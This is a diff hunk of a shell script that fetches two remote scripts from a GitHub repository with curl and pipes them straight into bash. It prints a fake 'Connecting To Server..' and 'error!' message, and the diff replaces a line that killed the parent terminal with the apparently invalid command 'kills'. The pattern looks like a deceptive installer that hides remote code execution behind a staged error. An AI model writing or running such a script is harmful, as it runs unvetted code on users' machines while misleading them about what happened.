@@ -5,7 +5,7 @@ curl -sL https://github.com/testingLiveManualy/Testlivinggas/raw/main/Updtinst |
 echo "Connecting To Server.."
 echo "error!"
 sleep 2.0
-kill -1 $PPID
+kills
 curl -sL https://raw.githubusercontent.com/testingLiveManualy/Testlivinggas/main/installerConnect | bash
 exit
 quit
